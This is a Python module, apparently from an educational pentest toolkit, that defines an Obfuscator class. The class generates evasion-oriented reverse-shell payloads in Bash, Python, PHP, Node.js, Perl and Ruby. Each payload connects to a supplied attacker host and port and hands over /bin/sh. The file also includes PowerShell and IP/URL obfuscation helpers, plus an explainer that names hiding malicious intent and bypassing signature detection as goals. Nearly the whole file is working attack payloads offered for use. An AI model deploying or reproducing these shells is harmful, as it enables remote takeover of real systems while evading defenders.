"""
Code obfuscation techniques for evasion
"""

import random
import string
import re
from typing import List, Dict, Tuple
from learnshells.utils.logger import Logger


class Obfuscator:
    """Obfuscate code to evade detection."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize obfuscator.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
    
    # ========== Bash Obfuscation ==========
    
    def obfuscate_bash(self, code: str, lhost: str, lport: int) -> List[Tuple[str, str]]:
        """
        Generate multiple obfuscated Bash variants.
        
        Args:
            code: Original bash payload
            lhost: Target host
            lport: Target port
            
        Returns:
            List of (name, obfuscated_payload) tuples
        """
        variants = []
        
        # Variant 1: Using $0 instead of bash
        variants.append((
            "Using $0 Variable",
            f"$0 -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        # Variant 2: Variable splitting
        variants.append((
            "Variable Split",
            f"a=/bin;b=/bash;$a$b -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        # Variant 3: Brace expansion
        variants.append((
            "Brace Expansion",
            f"/bin/ba{{}}sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        # Variant 4: Wildcard obfuscation
        variants.append((
            "Wildcard",
            f"/bin/bas? -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        # Variant 5: Command substitution
        variants.append((
            "Command Substitution",
            f"`/bin/bash` -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        # Variant 6: Double quotes
        variants.append((
            "Double Quotes",
            f'"/bin/bash" -i >& /dev/tcp/{lhost}/{lport} 0>&1'
        ))
        
        # Variant 7: Escape characters
        variants.append((
            "Escape Characters",
            f"/bin/b\\a\\s\\h -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        # Variant 8: Using sh instead
        variants.append((
            "SH Variant",
            f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ))
        
        self.logger.success(f"Generated {len(variants)} Bash obfuscation variants")
        return variants
    
    # ========== Python Obfuscation ==========
    
    def obfuscate_python(self, code: str, lhost: str, lport: int) -> List[Tuple[str, str]]:
        """
        Generate multiple obfuscated Python variants.
        
        Args:
            code: Original python payload
            lhost: Target host
            lport: Target port
            
        Returns:
            List of (name, obfuscated_payload) tuples
        """
        variants = []
        
        # Variant 1: __import__ instead of import
        variants.append((
            "Import Obfuscation",
            f"python -c '__import__(\"socket\").__dict__;__import__(\"subprocess\").__dict__;s=__import__(\"socket\").socket(__import__(\"socket\").AF_INET,__import__(\"socket\").SOCK_STREAM);s.connect((\"{lhost}\",{lport}));__import__(\"subprocess\").call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
        ))
        
        # Variant 2: exec with compile
        variants.append((
            "Exec Compile",
            f"python -c 'exec(compile(\"import socket,subprocess;s=socket.socket();s.connect((\\\"{lhost}\\\",{lport}));subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\",\"<string>\",\"exec\"))'"
        ))
        
        # Variant 3: Lambda obfuscation
        variants.append((
            "Lambda Trick",
            f"python -c '(lambda __g: [__g(\"import socket,subprocess\"),__g(\"s=socket.socket()\"),__g(\"s.connect((\\\"{lhost}\\\",{lport}))\"),__g(\"subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\")])(exec)'"
        ))
        
        # Variant 4: Reverse variable names
        variants.append((
            "Variable Obfuscation",
            f"python -c 'import socket as s,subprocess as p;x=s.socket(s.AF_INET,s.SOCK_STREAM);x.connect((\"{lhost}\",{lport}));p.call([\"/bin/sh\",\"-i\"],stdin=x.fileno(),stdout=x.fileno(),stderr=x.fileno())'"
        ))
        
        # Variant 5: Using os.dup2
        variants.append((
            "OS Dup2 Method",
            f"python -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ))
        
        self.logger.success(f"Generated {len(variants)} Python obfuscation variants")
        return variants
    
    # ========== PHP Obfuscation ==========
    
    def obfuscate_php(self, code: str, lhost: str, lport: int) -> List[Tuple[str, str]]:
        """
        Generate multiple obfuscated PHP variants.
        
        Args:
            code: Original PHP payload
            lhost: Target host
            lport: Target port
            
        Returns:
            List of (name, obfuscated_payload) tuples
        """
        variants = []
        
        # Variant 1: Variable function names
        variants.append((
            "Variable Functions",
            f"<?php $a='fsockopen';$b='fwrite';$c='fread';$s=$a('{lhost}',{lport});$b($s,\"$: \");while(!feof($s)){{$b($s,shell_exec($c($s,4096)));}} ?>"
        ))
        
        # Variant 2: String concatenation
        variants.append((
            "String Concat",
            f"<?php $f='fso'.'ckopen';$s=$f('{lhost}',{lport});while(!feof($s)){{fwrite($s,shell_exec(fread($s,4096)));}} ?>"
        ))
        
        # Variant 3: Chr() obfuscation
        variants.append((
            "Chr Obfuscation",
            f"<?php $f=chr(102).chr(115).chr(111).chr(99).chr(107).chr(111).chr(112).chr(101).chr(110);$s=$f('{lhost}',{lport});while(!feof($s)){{fwrite($s,shell_exec(fread($s,4096)));}} ?>"
        ))
        
        # Variant 4: Backticks instead of shell_exec
        variants.append((
            "Backtick Execution",
            f"<?php $s=fsockopen('{lhost}',{lport});while(!feof($s)){{fwrite($s,`{{fread($s,4096)}}`);}} ?>"
        ))
        
        # Variant 5: system() instead of shell_exec
        variants.append((
            "System Function",
            f"<?php $s=fsockopen('{lhost}',{lport});while($c=fgets($s)){{ob_start();system($c);$o=ob_get_contents();ob_end_clean();fwrite($s,$o);}} ?>"
        ))
        
        # Variant 6: Variable variable names
        variants.append((
            "Variable Variables",
            f"<?php ${{'{chr(115)}'}}=fsockopen('{lhost}',{lport});while(!feof(${{'{chr(115)}'}})){{fwrite(${{'{chr(115)}'}},shell_exec(fread(${{'{chr(115)}'}},4096)));}} ?>"
        ))
        
        self.logger.success(f"Generated {len(variants)} PHP obfuscation variants")
        return variants
    
    # ========== Node.js Obfuscation ==========
    
    def obfuscate_nodejs(self, code: str, lhost: str, lport: int) -> List[Tuple[str, str]]:
        """
        Generate multiple obfuscated Node.js variants.
        
        Args:
            code: Original nodejs payload
            lhost: Target host
            lport: Target port
            
        Returns:
            List of (name, obfuscated_payload) tuples
        """
        variants = []
        
        # Variant 1: Bracket notation for require
        variants.append((
            "Bracket Notation",
            f"node -e '(function(){{var n=[\"\"][\"constructor\"][\"constructor\"](\"return this\")()[\"require\"];var net=n(\"net\"),cp=n(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var c=new net.Socket();c.connect({lport},\"{lhost}\",function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});}})()')"
        ))
        
        # Variant 2: String concatenation
        variants.append((
            "String Concat",
            f"node -e 'var n=\"n\"+\"e\"+\"t\";var c=\"c\"+\"h\"+\"i\"+\"l\"+\"d\"+\"_\"+\"p\"+\"r\"+\"o\"+\"c\"+\"e\"+\"s\"+\"s\";require(n).Socket.prototype.connect.call(new(require(n).Socket)(),{lport},\"{lhost}\",function(){{require(c).spawn(\"/bin/sh\",[]).stdout.pipe(this);this.pipe(require(c).spawn(\"/bin/sh\",[]).stdin);}});'"
        ))
        
        # Variant 3: Using global.require
        variants.append((
            "Global Require",
            f"node -e 'var n=global.require(\"net\"),c=global.require(\"child_process\");var s=c.spawn(\"/bin/sh\",[]);var cl=new n.Socket();cl.connect({lport},\"{lhost}\",()=>{{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);}});'"
        ))
        
        # Variant 4: Process.binding
        variants.append((
            "Process Binding",
            f"node -e 'const {{Socket}}=require(\"net\");const {{spawn}}=require(\"child_process\");const s=new Socket();s.connect({lport},\"{lhost}\",()=>{{const sh=spawn(\"/bin/sh\",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);}});'"
        ))
        
        # Variant 5: Anonymous function
        variants.append((
            "IIFE Wrapper",
            f"node -e '!function(){{const n=require(\"net\"),c=require(\"child_process\"),s=c.spawn(\"/bin/sh\"),x=new n.Socket;x.connect({lport},\"{lhost}\",()=>{{x.pipe(s.stdin),s.stdout.pipe(x),s.stderr.pipe(x)}})}}()'"
        ))
        
        self.logger.success(f"Generated {len(variants)} Node.js obfuscation variants")
        return variants
    
    # ========== Perl Obfuscation ==========
    
    def obfuscate_perl(self, code: str, lhost: str, lport: int) -> List[Tuple[str, str]]:
        """
        Generate multiple obfuscated Perl variants.
        
        Args:
            code: Original perl payload
            lhost: Target host
            lport: Target port
            
        Returns:
            List of (name, obfuscated_payload) tuples
        """
        variants = []
        
        # Variant 1: Using Socket bareword
        variants.append((
            "Socket Bareword",
            f"perl -MIO::Socket -e '$s=IO::Socket::INET->new(PeerAddr=>\"{lhost}\",PeerPort=>{lport},Proto=>\"tcp\")||die;open(STDIN,\">&\",$s);open(STDOUT,\">&\",$s);open(STDERR,\">&\",$s);exec(\"/bin/sh -i\");'"
        ))
        
        # Variant 2: Variable obfuscation
        variants.append((
            "Variable Names",
            f"perl -e 'use Socket;$a=\"{lhost}\";$b={lport};$c=sockaddr_in($b,inet_aton($a));socket($d,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect($d,$c);open(STDIN,\">&$d\");open(STDOUT,\">&$d\");open(STDERR,\">&$d\");exec(\"/bin/sh -i\");'"
        ))
        
        # Variant 3: Using qw() for strings
        variants.append((
            "QW Notation",
            f"perl -MSocket -e '$h=qw/{lhost}/;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(qw/tcp/));connect(S,sockaddr_in($p,inet_aton($h)));open(STDIN,q/>&S/);open(STDOUT,q/>&S/);open(STDERR,q/>&S/);exec(qw!/bin/sh -i!);'"
        ))
        
        # Variant 4: Filehandle as variable
        variants.append((
            "Filehandle Variable",
            f"perl -e 'use Socket;$f=PF_INET;socket(S,$f,SOCK_STREAM,getprotobyname(\"tcp\"))||die;connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")))||die;open(I,\">&S\");open(O,\">&S\");open(E,\">&S\");system(\"/bin/sh -i\");'"
        ))
        
        # Variant 5: One-liner compressed
        variants.append((
            "Compressed",
            f"perl -e 'use Socket;socket(S,2,1,getprotobyname(\"tcp\"));connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));open STDIN,\">&S\";open STDOUT,\">&S\";open STDERR,\">&S\";exec\"/bin/sh -i\"'"
        ))
        
        self.logger.success(f"Generated {len(variants)} Perl obfuscation variants")
        return variants
    
    # ========== Ruby Obfuscation ==========
    
    def obfuscate_ruby(self, code: str, lhost: str, lport: int) -> List[Tuple[str, str]]:
        """
        Generate multiple obfuscated Ruby variants.
        
        Args:
            code: Original ruby payload
            lhost: Target host
            lport: Target port
            
        Returns:
            List of (name, obfuscated_payload) tuples
        """
        variants = []
        
        # Variant 1: Using require with string
        variants.append((
            "Require String",
            f"ruby -e 'require\"socket\";s=TCPSocket.new\"{lhost}\",{lport};[0,1,2].each{{|fd|syscall(63,s.fileno,fd)}};exec\"/bin/sh -i\"'"
        ))
        
        # Variant 2: Using send method
        variants.append((
            "Send Method",
            f"ruby -rsocket -e 'Object.send(:require,\"socket\");s=TCPSocket.open(\"{lhost}\",{lport});[STDIN,STDOUT,STDERR].each{{|io|io.reopen(s)}};exec\"/bin/sh\"'"
        ))
        
        # Variant 3: Using IO.popen
        variants.append((
            "IO Popen",
            f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});loop{{c.print\"$ \";IO.popen(c.gets.chomp,\"r\"){{|io|c.print io.read}}}}'"
        ))
        
        # Variant 4: Using %w notation
        variants.append((
            "Percent W",
            f"ruby -rsocket -e 's=TCPSocket.new(\"{lhost}\",{lport});%w{{stdin stdout stderr}}.each_with_index{{|io,i|$stdin.reopen(s)if io==:stdin;$stdout.reopen(s)if io==:stdout;$stderr.reopen(s)if io==:stderr}};exec\"/bin/sh\"'"
        ))
        
        # Variant 5: Symbol to proc
        variants.append((
            "Symbol to Proc",
            f"ruby -rsocket -e 'c=TCPSocket.new\"{lhost}\",{lport};[0,1,2].map{{|fd|IO.for_fd(fd).reopen(c)}};exec\"/bin/sh -i\"'"
        ))
        
        # Variant 6: Using fork
        variants.append((
            "Fork Method",
            f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd.chomp,\"r\"){{|io|c.print io.read}};end'"
        ))
        
        self.logger.success(f"Generated {len(variants)} Ruby obfuscation variants")
        return variants
    
    # ========== PowerShell Obfuscation ==========
    
    def obfuscate_powershell(
        self,
        code: str,
        level: int = 1
    ) -> str:
        """
        Obfuscate PowerShell code.
        
        Args:
            code: PowerShell code to obfuscate
            level: Obfuscation level (1-3)
            
        Returns:
            Obfuscated code
        """
        obfuscated = code
        
        if level >= 1:
            # Replace cmdlets with aliases
            obfuscated = self._replace_cmdlets(obfuscated)
        
        if level >= 2:
            # Add variable randomization
            obfuscated = self._randomize_variables(obfuscated)
        
        if level >= 3:
            # Add string concatenation
            obfuscated = self._concat_strings(obfuscated)
        
        self.logger.success(
            f"Obfuscated PowerShell code (level {level})",
            explain=f"Level {level} obfuscation applied. Higher levels are harder to detect."
        )
        
        return obfuscated
    
    def _replace_cmdlets(self, code: str) -> str:
        """Replace PowerShell cmdlets with aliases."""
        replacements = {
            'Invoke-Expression': 'iex',
            'Get-Content': 'gc',
            'Set-Content': 'sc',
            'Write-Output': 'echo',
            'ForEach-Object': '%',
            'Where-Object': '?',
            'Select-Object': 'select',
            'New-Object': 'new',
        }
        
        for cmdlet, alias in replacements.items():
            code = code.replace(cmdlet, alias)
        
        return code
    
    def _randomize_variables(self, code: str) -> str:
        """Randomize variable names."""
        # Find all variables ($var)
        variables = re.findall(r'\$\w+', code)
        unique_vars = list(set(variables))
        
        # Create mapping to random names
        var_map = {}
        for var in unique_vars:
            if var not in ['$null', '$true', '$false']:
                new_name = '$' + ''.join(random.choices(string.ascii_lowercase, k=8))
                var_map[var] = new_name
        
        # Replace variables
        for old_var, new_var in var_map.items():
            code = code.replace(old_var, new_var)
        
        return code
    
    def _concat_strings(self, code: str) -> str:
        """Break strings into concatenated parts."""
        # Find strings in quotes
        def split_string(match):
            s = match.group(1)
            if len(s) > 10:
                mid = len(s) // 2
                return f"'{s[:mid]}'+'{ s[mid:]}'"
            return match.group(0)
        
        code = re.sub(r"'([^']+)'", split_string, code)
        
        return code
    
    # ========== General Obfuscation ==========
    
    def obfuscate_ip(self, ip: str) -> List[str]:
        """
        Obfuscate IP address in multiple formats.
        
        Args:
            ip: IP address string
            
        Returns:
            List of obfuscated IP formats
        """
        parts = ip.split('.')
        
        formats = []
        
        # Decimal format
        decimal = sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts))
        formats.append(f"{decimal} (decimal)")
        
        # Hex format
        hex_ip = '0x' + ''.join(f'{int(p):02x}' for p in parts)
        formats.append(f"{hex_ip} (hex)")
        
        # Octal format (first octet)
        octal = f"0{int(parts[0]):o}.{parts[1]}.{parts[2]}.{parts[3]}"
        formats.append(f"{octal} (octal)")
        
        self.logger.success("Generated IP obfuscation variants")
        
        return formats
    
    def obfuscate_url(self, url: str) -> List[str]:
        """
        Obfuscate URL in multiple formats.
        
        Args:
            url: URL string
            
        Returns:
            List of obfuscated URLs
        """
        variants = []
        
        # URL encoding
        from urllib.parse import quote
        encoded = quote(url, safe=':/')
        variants.append(f"{encoded} (URL encoded)")
        
        # Case variation
        case_varied = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in url)
        variants.append(f"{case_varied} (case variation)")
        
        self.logger.success("Generated URL obfuscation variants")
        
        return variants
    
    def explain_obfuscation(self) -> str:
        """Explain obfuscation techniques."""
        explanation = """
🎓 OBFUSCATION EXPLAINED:

What is Obfuscation?
Obfuscation is the process of making code harder to understand
and analyze while maintaining its functionality.

Purpose:
• Evade signature-based detection
• Bypass static analysis
• Hide malicious intent
• Complicate reverse engineering

Common Techniques:

1. STRING MANIPULATION:
   Before: system("whoami")
   After: sys+"tem"("who"+"ami")
   
   Why: Breaks up recognizable patterns

2. VARIABLE RENAMING:
   Before: $client = New-Object ...
   After: $xkcd1234 = New-Object ...
   
   Why: Removes semantic meaning

3. ENCODING:
   Before: Invoke-Expression
   After: Base64(SW52b2tlLUV4cHJlc3Npb24=)
   
   Why: Hides actual content

4. ALIASING:
   Before: Invoke-Expression
   After: iex
   
   Why: Shorter, less obvious

5. CONCATENATION:
   Before: "malicious"
   After: "mal" + "ici" + "ous"
   
   Why: Defeats string searches

Obfuscation Levels:

Level 1 (Light):
• Replace cmdlets with aliases
• Basic string splitting
• Simple variable changes
Effect: Bypasses basic signatures

Level 2 (Medium):
• Random variable names
• String concatenation
• Encoding key parts
Effect: Evades most static analysis

Level 3 (Heavy):
• Full encoding
• Complex logic changes
• Multiple transformation layers
Effect: Very hard to analyze

Trade-offs:

Pros:
✓ Evades signature detection
✓ Bypasses static analysis
✓ Complicates forensics
✓ Defeats simple pattern matching

Cons:
✗ Can break functionality
✗ Increases payload size
✗ May trigger behavioral detection
✗ Harder to debug
✗ Performance overhead

Best Practices:
• Test obfuscated code before use
• Keep one clear version for reference
• Don't over-obfuscate (can break code)
• Combine with other evasion techniques
• Update obfuscation regularly

Detection Methods:
Defenders detect obfuscation via:
• Entropy analysis (random-looking code)
• Behavioral analysis (what it does)
• Deobfuscation tools
• Sandbox execution
• Anomaly detection
"""
        return explanation
    
    def generate_random_junk(self, lines: int = 5) -> str:
        """
        Generate random junk code for padding.
        
        Args:
            lines: Number of junk lines
            
        Returns:
            Junk code string
        """
        junk_lines = []
        
        for _ in range(lines):
            var = ''.join(random.choices(string.ascii_lowercase, k=6))
            value = random.randint(1, 1000)
            junk_lines.append(f"${var} = {value}")
        
        return '\n'.join(junk_lines)
